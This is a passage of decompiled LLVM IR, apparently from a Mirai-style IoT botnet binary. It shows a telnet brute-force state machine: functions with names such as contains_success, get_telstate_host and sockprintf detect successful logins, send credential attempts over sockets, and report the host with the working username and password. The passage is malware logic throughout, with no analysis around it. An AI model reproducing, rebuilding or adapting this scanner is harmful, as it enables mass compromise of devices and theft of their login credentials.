  store i32 %v0_804dd23, i32* %v2_804dd23, align 4
  %v1_804dd26 = call i32 @read_until_response(i32 %v6_804d170)
  store i32 %v1_804dd26, i32* %eax.global-to-local, align 4
  %v1_804dd2b = icmp eq i32 %v1_804dd26, 0
  br i1 %v1_804dd2b, label %dec_label_pc_804df12, label %dec_label_pc_804dd33

dec_label_pc_804dd33:                             ; preds = %dec_label_pc_804dcd2
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804dd36 = load i32, i32* @esp, align 4
  %v1_804dd36 = inttoptr i32 %v0_804dd36 to i32*
  store i32 0, i32* %v1_804dd36, align 4
  %v1_804dd3d = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804dd3d = call i32 @__GI_time(i32* %v1_804dd3d)
  store i32 %v2_804dd3d, i32* @esi, align 4
  %v0_804dd47 = load i32, i32* @ebx, align 4
  %v2_804dd57 = mul i32 %v0_804dd47, 28
  %v1_804dd5b = add i32 %v2_804dd59, %v2_804dd57
  %v2_804dd5e = inttoptr i32 %v1_804dd5b to i32*
  store i32 %v2_804dd3d, i32* %v2_804dd5e, align 4
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v1_804dcea, i32* %eax.global-to-local, align 4
  %v2_804dd7b = load i32, i32* %v1_804dced, align 4
  store i32 %v2_804dd7b, i32* %eax.global-to-local, align 4
  %v1_804dd7d = load i32, i32* @esp, align 4
  %v2_804dd7d = inttoptr i32 %v1_804dd7d to i32*
  store i32 %v2_804dd7b, i32* %v2_804dd7d, align 4
  %v1_804dd80 = call i32 @contains_fail(i32 %stack_var_-628.248)
  store i32 %v1_804dd80, i32* %eax.global-to-local, align 4
  %v1_804dd85 = icmp eq i32 %v1_804dd80, 0
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804dd85, label %dec_label_pc_804ddb7, label %dec_label_pc_804dd89

dec_label_pc_804dd89:                             ; preds = %dec_label_pc_804dd33
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804dda2 = load i32, i32* @esp, align 4
  %v1_804dda2 = add i32 %v0_804dda2, 4
  %v2_804dda2 = inttoptr i32 %v1_804dda2 to i32*
  store i32 0, i32* %v2_804dda2, align 4
  %v0_804ddaa = load i32, i32* %eax.global-to-local, align 4
  %v1_804ddaa = load i32, i32* @esp, align 4
  %v2_804ddaa = inttoptr i32 %v1_804ddaa to i32*
  store i32 %v0_804ddaa, i32* %v2_804ddaa, align 4
  %v3_804ddad = call i32 @advance_state(i32* %v1_804dd3d, i32 %stack_var_-624.247)
  store i32 %v3_804ddad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804ddb7:                             ; preds = %dec_label_pc_804dd33
  store i32 %v1_804dcea, i32* %eax.global-to-local, align 4
  %v2_804ddd2 = load i32, i32* %v1_804dced, align 4
  store i32 %v2_804ddd2, i32* %eax.global-to-local, align 4
  %v1_804ddd4 = load i32, i32* @esp, align 4
  %v2_804ddd4 = inttoptr i32 %v1_804ddd4 to i32*
  store i32 %v2_804ddd2, i32* %v2_804ddd4, align 4
  %v1_804ddd7 = call i32 @contains_success(i32 %stack_var_-628.248)
  store i32 %v1_804ddd7, i32* %eax.global-to-local, align 4
  %v1_804dddc = icmp eq i32 %v1_804ddd7, 0
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804dddc, label %dec_label_pc_804deec, label %dec_label_pc_804dde4

dec_label_pc_804dde4:                             ; preds = %dec_label_pc_804ddb7
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804ddfa = add i32 %v2_804d1b0, %v2_804d120
  %v4_804ddfa = inttoptr i32 %v3_804ddfa to i8*
  %v5_804ddfa = load i8, i8* %v4_804ddfa, align 1
  %v6_804ddfa = zext i8 %v5_804ddfa to i32
  store i32 %v6_804ddfa, i32* %eax.global-to-local, align 4
  %v10_804ddff = icmp eq i8 %v5_804ddfa, 2
  %v1_804de01 = icmp eq i1 %v10_804ddff, false
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804de01, label %dec_label_pc_804de31, label %dec_label_pc_804de03

dec_label_pc_804de03:                             ; preds = %dec_label_pc_804dde4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804de1c = load i32, i32* @esp, align 4
  %v1_804de1c = add i32 %v0_804de1c, 4
  %v2_804de1c = inttoptr i32 %v1_804de1c to i32*
  store i32 7, i32* %v2_804de1c, align 4
  %v0_804de24 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de24 = load i32, i32* @esp, align 4
  %v2_804de24 = inttoptr i32 %v1_804de24 to i32*
  store i32 %v0_804de24, i32* %v2_804de24, align 4
  %v3_804de27 = call i32 @advance_state(i32* %v1_804dd3d, i32 %stack_var_-624.247)
  store i32 %v3_804de27, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804de31:                             ; preds = %dec_label_pc_804dde4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804de47 = add i32 %v2_804d2a1, %v2_804d120
  %v4_804de47 = inttoptr i32 %v3_804de47 to i8*
  %v5_804de47 = load i8, i8* %v4_804de47, align 1
  %v6_804de47 = zext i8 %v5_804de47 to i32
  store i32 %v6_804de47, i32* %eax.global-to-local, align 4
  %v1_804de4f = mul nuw nsw i32 %v6_804de47, 4
  %v2_804de4f = add nuw nsw i32 %v1_804de4f, 134590900
  %v3_804de4f = inttoptr i32 %v2_804de4f to i32*
  %v4_804de4f = load i32, i32* %v3_804de4f, align 4
  store i32 %v4_804de4f, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804de6c = add i32 %v2_804d2e8, %v2_804d120
  %v4_804de6c = inttoptr i32 %v3_804de6c to i8*
  %v5_804de6c = load i8, i8* %v4_804de6c, align 2
  %v6_804de6c = zext i8 %v5_804de6c to i32
  store i32 %v6_804de6c, i32* %eax.global-to-local, align 4
  %v1_804de74 = mul nuw nsw i32 %v6_804de6c, 4
  %v2_804de74 = add nuw nsw i32 %v1_804de74, 134590884
  %v3_804de74 = inttoptr i32 %v2_804de74 to i32*
  %v4_804de74 = load i32, i32* %v3_804de74, align 4
  store i32 %v4_804de74, i32* @esi, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804de94 = load i32, i32* @esp, align 4
  %v2_804de94 = inttoptr i32 %v1_804de94 to i32*
  store i32 %v2_804d122, i32* %v2_804de94, align 4
  %v0_804de97 = call i32 @get_telstate_host()
  store i32 %v0_804de97, i32* %eax.global-to-local, align 4
  %v0_804de9c = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804de9c, i32* %edx.global-to-local, align 4
  %v0_804dea2 = load i32, i32* @ebx, align 4
  %v1_804dea2 = load i32, i32* @esp, align 4
  %v2_804dea2 = add i32 %v1_804dea2, 16
  %v3_804dea2 = inttoptr i32 %v2_804dea2 to i32*
  store i32 %v0_804dea2, i32* %v3_804dea2, align 4
  %v0_804dea6 = load i32, i32* @esi, align 4
  %v1_804dea6 = load i32, i32* @esp, align 4
  %v2_804dea6 = add i32 %v1_804dea6, 12
  %v3_804dea6 = inttoptr i32 %v2_804dea6 to i32*
  store i32 %v0_804dea6, i32* %v3_804dea6, align 4
  %v1_804deaa = load i32, i32* @esp, align 4
  %v2_804deaa = add i32 %v1_804deaa, 8
  %v3_804deaa = inttoptr i32 %v2_804deaa to i32*
  store i32 %v0_804de97, i32* %v3_804deaa, align 4
  %v0_804deae = load i32, i32* @esp, align 4
  %v1_804deae = add i32 %v0_804deae, 4
  %v2_804deae = inttoptr i32 %v1_804deae to i32*
  store i32 ptrtoint ([23 x i8]* @global_var_8058e99.253 to i32), i32* %v2_804deae, align 4
  %v0_804deb6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804deb6 = load i32, i32* @esp, align 4
  %v2_804deb6 = inttoptr i32 %v1_804deb6 to i32*
  store i32 %v0_804deb6, i32* %v2_804deb6, align 4
  %v2_804deb9 = call i32 @sockprintf(i32 %stack_var_-628.248, i32 %stack_var_-624.247)
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804ded7 = load i32, i32* @esp, align 4
  %v1_804ded7 = add i32 %v0_804ded7, 4
  %v2_804ded7 = inttoptr i32 %v1_804ded7 to i32*
  store i32 7, i32* %v2_804ded7, align 4
  %v0_804dedf = load i32, i32* %eax.global-to-local, align 4
  %v1_804dedf = load i32, i32* @esp, align 4
  %v2_804dedf = inttoptr i32 %v1_804dedf to i32*
  store i32 %v0_804dedf, i32* %v2_804dedf, align 4
  %v3_804dee2 = call i32 @advance_state(i32* %v1_804dd3d, i32 %stack_var_-624.247)
  store i32 %v3_804dee2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804deec:                             ; preds = %dec_label_pc_804ddb7
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804df05 = load i32, i32* @esp, align 4
  %v2_804df05 = inttoptr i32 %v1_804df05 to i32*
  store i32 %v2_804d122, i32* %v2_804df05, align 4
  %v1_804df08 = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804df08, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804df12:                             ; preds = %dec_label_pc_804dcd2
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804df2d = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804df2d, i32* %eax.global-to-local, align 4
  %v1_804df2f = add i32 %v2_804df2d, 7
  store i32 %v1_804df2f, i32* @ebx, align 4
  %v0_804df32 = load i32, i32* @esp, align 4
  %v1_804df32 = inttoptr i32 %v0_804df32 to i32*
  store i32 0, i32* %v1_804df32, align 4
  %v1_804df39 = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804df39 = call i32 @__GI_time(i32* %v1_804df39)
  store i32 %v2_804df39, i32* %eax.global-to-local, align 4
  %v0_804df3e = load i32, i32* @ebx, align 4
  %v7_804df3e = icmp ult i32 %v0_804df3e, %v2_804df39
  %v1_804df40 = icmp eq i1 %v7_804df3e, false
  br i1 %v1_804df40, label %dec_label_pc_804e0dc, label %dec_label_pc_804df46

dec_label_pc_804df46:                             ; preds = %dec_label_pc_804df12
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804df5f = load i32, i32* @esp, align 4
  %v2_804df5f = inttoptr i32 %v1_804df5f to i32*
  store i32 %v2_804d122, i32* %v2_804df5f, align 4
  %v1_804df62 = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804df62, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804df6c:                             ; preds = %dec_label_pc_804d15a
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804df6f = load i32, i32* @esp, align 4
  %v1_804df6f = inttoptr i32 %v0_804df6f to i32*
  store i32 0, i32* %v1_804df6f, align 4
  %v1_804df76 = inttoptr i32 %v6_804d170 to i32*
  %v2_804df76 = call i32 @__GI_time(i32* %v1_804df76)
  %v0_804df80 = load i32, i32* @ebx, align 4
  %v2_804df90 = mul i32 %v0_804df80, 28
  %v1_804df94 = add i32 %v2_804dd59, %v2_804df90
  %v2_804df97 = inttoptr i32 %v1_804df94 to i32*
  store i32 %v2_804df76, i32* %v2_804df97, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804dfaf = inttoptr i32 %v2_804d122 to i32*
  %v4_804dfaf = load i32, i32* %v3_804dfaf, align 4
  store i32 %v4_804dfaf, i32* %eax.global-to-local, align 4
  %v0_804dfb2 = load i32, i32* @esp, align 4
  %v1_804dfb2 = add i32 %v0_804dfb2, 12
  %v2_804dfb2 = inttoptr i32 %v1_804dfb2 to i32*
  store i32 16384, i32* %v2_804dfb2, align 4
  %v0_804dfba = load i32, i32* @esp, align 4
  %v1_804dfba = add i32 %v0_804dfba, 8
  %v2_804dfba = inttoptr i32 %v1_804dfba to i32*
  store i32 4, i32* %v2_804dfba, align 4
  %v0_804dfc2 = load i32, i32* @esp, align 4
  %v1_804dfc2 = add i32 %v0_804dfc2, 4
  %v2_804dfc2 = inttoptr i32 %v1_804dfc2 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8058eb0.254 to i32), i32* %v2_804dfc2, align 4
  %v0_804dfca = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfca = load i32, i32* @esp, align 4
  %v2_804dfca = inttoptr i32 %v1_804dfca to i32*
  store i32 %v0_804dfca, i32* %v2_804dfca, align 4
  %v4_804dfcd = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804d02b, i32 %v6_804d170)
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804dfe8 = load i32, i32* %v3_804dfaf, align 4
  store i32 %v4_804dfe8, i32* %eax.global-to-local, align 4
  %v0_804dfeb = load i32, i32* @esp, align 4
  %v1_804dfeb = add i32 %v0_804dfeb, 12
  %v2_804dfeb = inttoptr i32 %v1_804dfeb to i32*
  store i32 16384, i32* %v2_804dfeb, align 4
  %v0_804dff3 = load i32, i32* @esp, align 4
  %v1_804dff3 = add i32 %v0_804dff3, 8
  %v2_804dff3 = inttoptr i32 %v1_804dff3 to i32*
  store i32 7, i32* %v2_804dff3, align 4
  %v0_804dffb = load i32, i32* @esp, align 4
  %v1_804dffb = add i32 %v0_804dffb, 4
  %v2_804dffb = inttoptr i32 %v1_804dffb to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8058eb5.255 to i32), i32* %v2_804dffb, align 4
  %v0_804e003 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e003 = load i32, i32* @esp, align 4
  %v2_804e003 = inttoptr i32 %v1_804e003 to i32*
  store i32 %v0_804e003, i32* %v2_804e003, align 4
  %v4_804e006 = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804d02b, i32 %v6_804d170)
  %v0_804e00b = load i32, i32* bitcast ([9 x i8*]* @global_var_805b1a0.262 to i32*), align 32
  %v5_804e015 = inttoptr i32 %v0_804e00b to i8*
  %v1_804e01b = and i32 %v0_804e00b, -256
  store i32 %v1_804e01b, i32* %eax.global-to-local, align 4
  store i32 %v0_804e00b, i32* @edi, align 4
  %v3_804e024 = call i32 @_strlen(i8* %v5_804e015)
  store i32 %v3_804e024, i32* @ebx, align 4
  %v0_804e02d = load i32, i32* bitcast ([9 x i8*]* @global_var_805b1a0.262 to i32*), align 32
  store i32 %v0_804e02d, i32* @esi, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804e049 = load i32, i32* %v3_804dfaf, align 4
  store i32 %v4_804e049, i32* %eax.global-to-local, align 4
  %v0_804e04c = load i32, i32* @esp, align 4
  %v1_804e04c = add i32 %v0_804e04c, 12
  %v2_804e04c = inttoptr i32 %v1_804e04c to i32*
  store i32 16384, i32* %v2_804e04c, align 4
  %v0_804e054 = load i32, i32* @ebx, align 4
  %v1_804e054 = load i32, i32* @esp, align 4
  %v2_804e054 = add i32 %v1_804e054, 8
  %v3_804e054 = inttoptr i32 %v2_804e054 to i32*
  store i32 %v0_804e054, i32* %v3_804e054, align 4
  %v0_804e058 = load i32, i32* @esi, align 4
  %v1_804e058 = load i32, i32* @esp, align 4
  %v2_804e058 = add i32 %v1_804e058, 4
  %v3_804e058 = inttoptr i32 %v2_804e058 to i32*
  store i32 %v0_804e058, i32* %v3_804e058, align 4
  %v0_804e05c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e05c = load i32, i32* @esp, align 4
  %v2_804e05c = inttoptr i32 %v1_804e05c to i32*
  store i32 %v0_804e05c, i32* %v2_804e05c, align 4
  %v5_804e05f = call i32 @__libc_send(i32 %v0_804e00b, i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804d02b)
  store i32 %v5_804e05f, i32* %eax.global-to-local, align 4
  %v2_804e064 = icmp slt i32 %v5_804e05f, 0
  %v1_804e066 = icmp eq i1 %v2_804e064, false
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804e066, label %dec_label_pc_804e08b, label %dec_label_pc_804e068

dec_label_pc_804e068:                             ; preds = %dec_label_pc_804df6c
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804e081 = load i32, i32* @esp, align 4
  %v2_804e081 = inttoptr i32 %v1_804e081 to i32*
  store i32 %v2_804d122, i32* %v2_804e081, align 4
  %v2_804e084 = call i32 @reset_telstate(i32 %v0_804e00b)
  store i32 %v2_804e084, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804e08b:                             ; preds = %dec_label_pc_804df6c
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804e0a6 = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804e0a6, i32* %eax.global-to-local, align 4
  %v1_804e0a8 = add i32 %v2_804e0a6, 25
  store i32 %v1_804e0a8, i32* @ebx, align 4
  %v0_804e0ab = load i32, i32* @esp, align 4
  %v1_804e0ab = inttoptr i32 %v0_804e0ab to i32*
  store i32 0, i32* %v1_804e0ab, align 4
  %tmp38 = inttoptr i32 %v0_804e00b to i32*
  %v3_804e0b2 = call i32 @__GI_time(i32* %tmp38)
  store i32 %v3_804e0b2, i32* %eax.global-to-local, align 4
  %v0_804e0b7 = load i32, i32* @ebx, align 4
  %v7_804e0b7 = icmp ult i32 %v0_804e0b7, %v3_804e0b2
  %v1_804e0b9 = icmp eq i1 %v7_804e0b7, false
  br i1 %v1_804e0b9, label %dec_label_pc_804e0dc, label %dec_label_pc_804e0bb

dec_label_pc_804e0bb:                             ; preds = %dec_label_pc_804e08b
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804e0d4 = load i32, i32* @esp, align 4
  %v2_804e0d4 = inttoptr i32 %v1_804e0d4 to i32*
  store i32 %v2_804d122, i32* %v2_804e0d4, align 4
  %v2_804e0d7 = call i32 @reset_telstate(i32 %v0_804e00b)
  store i32 %v2_804e0d7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804e0dc:                             ; preds = %dec_label_pc_804d15a, %dec_label_pc_804e08b, %dec_label_pc_804df12, %dec_label_pc_804db25, %dec_label_pc_804d892, %dec_label_pc_804d752, %dec_label_pc_804d395, %dec_label_pc_804e068, %dec_label_pc_804df46, %dec_label_pc_804deec, %dec_label_pc_804de31, %dec_label_pc_804de03, %dec_label_pc_804dd89, %dec_label_pc_804dca4, %dec_label_pc_804dc7e, %dec_label_pc_804dc1b, %dec_label_pc_804db59, %dec_label_pc_804daf7, %dec_label_pc_804dac9, %dec_label_pc_804da11, %dec_label_pc_804d9eb, %dec_label_pc_804d988, %dec_label_pc_804d8c6, %dec_label_pc_804d864, %dec_label_pc_804d836, %dec_label_pc_804d786, %dec_label_pc_804d72c, %dec_label_pc_804d692, %dec_label_pc_804d66c, %dec_label_pc_804d518, %dec_label_pc_804d4f2, %dec_label_pc_804d375, %dec_label_pc_804d336, %dec_label_pc_804e0bb
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.247, %dec_label_pc_804d15a ], [ %stack_var_-624.247, %dec_label_pc_804e08b ], [ %stack_var_-624.247, %dec_label_pc_804e0bb ], [ %stack_var_-624.247, %dec_label_pc_804e068 ], [ %stack_var_-624.247, %dec_label_pc_804df12 ], [ %stack_var_-624.247, %dec_label_pc_804df46 ], [ %stack_var_-624.247, %dec_label_pc_804deec ], [ %stack_var_-624.247, %dec_label_pc_804de31 ], [ %stack_var_-624.247, %dec_label_pc_804de03 ], [ %stack_var_-624.247, %dec_label_pc_804dd89 ], [ %stack_var_-624.247, %dec_label_pc_804dca4 ], [ %stack_var_-624.247, %dec_label_pc_804dc7e ], [ %stack_var_-624.247, %dec_label_pc_804dc1b ], [ %stack_var_-624.247, %dec_label_pc_804db25 ], [ %stack_var_-624.247, %dec_label_pc_804db59 ], [ %stack_var_-624.247, %dec_label_pc_804daf7 ], [ %stack_var_-624.247, %dec_label_pc_804dac9 ], [ %v4_804d90a, %dec_label_pc_804da11 ], [ %v4_804d90a, %dec_label_pc_804d9eb ], [ %v4_804d90a, %dec_label_pc_804d988 ], [ %stack_var_-624.247, %dec_label_pc_804d892 ], [ %stack_var_-624.247, %dec_label_pc_804d8c6 ], [ %stack_var_-624.247, %dec_label_pc_804d864 ], [ %stack_var_-624.247, %dec_label_pc_804d836 ], [ %stack_var_-624.247, %dec_label_pc_804d752 ], [ %stack_var_-624.247, %dec_label_pc_804d786 ], [ %stack_var_-624.247, %dec_label_pc_804d72c ], [ %stack_var_-624.247, %dec_label_pc_804d692 ], [ %stack_var_-624.247, %dec_label_pc_804d66c ], [ %stack_var_-624.247, %dec_label_pc_804d395 ], [ %stack_var_-624.247, %dec_label_pc_804d518 ], [ %stack_var_-624.247, %dec_label_pc_804d4f2 ], [ %stack_var_-624.247, %dec_label_pc_804d375 ], [ %stack_var_-624.247, %dec_label_pc_804d336 ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.248, %dec_label_pc_804d15a ], [ %stack_var_-628.248, %dec_label_pc_804e08b ], [ %stack_var_-628.248, %dec_label_pc_804e0bb ], [ %stack_var_-628.248, %dec_label_pc_804e068 ], [ %stack_var_-628.248, %dec_label_pc_804df12 ], [ %stack_var_-628.248, %dec_label_pc_804df46 ], [ %stack_var_-628.248, %dec_label_pc_804deec ], [ %stack_var_-628.248, %dec_label_pc_804de31 ], [ %stack_var_-628.248, %dec_label_pc_804de03 ], [ %stack_var_-628.248, %dec_label_pc_804dd89 ], [ %v4_804db9d, %dec_label_pc_804dca4 ], [ %v4_804db9d, %dec_label_pc_804dc7e ], [ %v4_804db9d, %dec_label_pc_804dc1b ], [ %stack_var_-628.248, %dec_label_pc_804db25 ], [ %stack_var_-628.248, %dec_label_pc_804db59 ], [ %stack_var_-628.248, %dec_label_pc_804daf7 ], [ %stack_var_-628.248, %dec_label_pc_804dac9 ], [ %stack_var_-628.248, %dec_label_pc_804da11 ], [ %stack_var_-628.248, %dec_label_pc_804d9eb ], [ %stack_var_-628.248, %dec_label_pc_804d988 ], [ %stack_var_-628.248, %dec_label_pc_804d892 ], [ %stack_var_-628.248, %dec_label_pc_804d8c6 ], [ %stack_var_-628.248, %dec_label_pc_804d864 ], [ %stack_var_-628.248, %dec_label_pc_804d836 ], [ %stack_var_-628.248, %dec_label_pc_804d752 ], [ %stack_var_-628.248, %dec_label_pc_804d786 ], [ %stack_var_-628.248, %dec_label_pc_804d72c ], [ %stack_var_-628.248, %dec_label_pc_804d692 ], [ %stack_var_-628.248, %dec_label_pc_804d66c ], [ %stack_var_-628.248, %dec_label_pc_804d395 ], [ %stack_var_-628.248, %dec_label_pc_804d518 ], [ %stack_var_-628.248, %dec_label_pc_804d4f2 ], [ %stack_var_-628.248, %dec_label_pc_804d375 ], [ %stack_var_-628.248, %dec_label_pc_804d336 ]
  %v4_804e0dc = add nuw nsw i32 %storemerge49, 1
  store i32 %v4_804e0dc, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804e0dc, %arg2
  br i1 %exitcond, label %dec_label_pc_804d100, label %dec_label_pc_804d10c

; uselistorder directives
  uselistorder i32 %v4_804e0dc, { 1, 2, 0 }
  uselistorder i32 %stack_var_-628.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32* %v1_804dd3d, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dcbd, { 1, 0 }
  uselistorder i32 %v4_804db9d, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804db10, { 1, 0 }
  uselistorder i32 %v0_804da2a, { 1, 0 }
  uselistorder i32 %v4_804d90a, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804d87d, { 1, 0 }
  uselistorder i32 %v5_804d5f7, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804d596, { 1, 0 }
  uselistorder i32 %v2_804d57a, { 1, 0 }
  uselistorder i32 %v2_804d3e5, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_804d1d8, { 1, 0 }
  uselistorder i32 %v6_804d170, { 8, 9, 10, 7, 5, 6, 4, 2, 3, 1, 0, 12, 11, 13 }
  uselistorder i32* %v1_804d127, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804d124, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804d122, { 50, 49, 52, 51, 53, 39, 38, 41, 40, 42, 44, 43, 45, 46, 47, 48, 34, 33, 36, 35, 37, 28, 27, 29, 30, 31, 32, 23, 22, 25, 24, 26, 17, 16, 18, 19, 20, 21, 9, 8, 11, 10, 12, 14, 13, 15, 0, 2, 1, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804d120, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 5, 41, 42, 7, 43, 8, 44, 9 }
  uselistorder i32 %v1_804d112, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %stack_var_-624.247, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %stack_var_-628.248, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %storemerge49, { 2, 3, 4, 5, 6, 8, 7, 0, 1 }
  uselistorder i32 %v4_804d0ef, { 1, 2, 0 }
  uselistorder i32 %storemerge259, { 1, 0 }
  uselistorder i32 %v2_804d048, { 1, 0 }
  uselistorder i32 %v2_804d02b, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 3, 2, 1, 0, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 5, 4, 3, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 6, 0, 10, 9, 4, 7, 8, 2, 1, 5, 11, 3, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 45, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32* %eax.global-to-local, { 198, 1, 0, 4, 2, 3, 6, 5, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 22, 20, 21, 24, 23, 27, 25, 26, 29, 28, 30, 31, 32, 33, 36, 34, 35, 37, 38, 41, 39, 40, 44, 42, 43, 47, 45, 46, 49, 48, 50, 51, 54, 52, 55, 53, 56, 57, 58, 60, 59, 63, 61, 62, 64, 65, 66, 67, 68, 69, 71, 70, 74, 72, 73, 79, 76, 80, 77, 78, 81, 82, 75, 83, 84, 85, 88, 86, 89, 87, 90, 91, 92, 94, 93, 97, 95, 96, 98, 99, 100, 101, 102, 103, 105, 104, 108, 106, 107, 113, 110, 114, 111, 112, 115, 116, 109, 117, 118, 119, 121, 120, 124, 122, 123, 126, 125, 129, 127, 128, 130, 131, 132, 133, 134, 135, 137, 136, 138, 139, 140, 142, 141, 143, 144, 145, 146, 147, 150, 148, 149, 152, 151, 153, 154, 157, 155, 156, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 176, 191, 192, 193, 194, 195, 196, 197, 220, 199, 200, 213, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 221, 214, 215, 216, 217, 219, 218 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
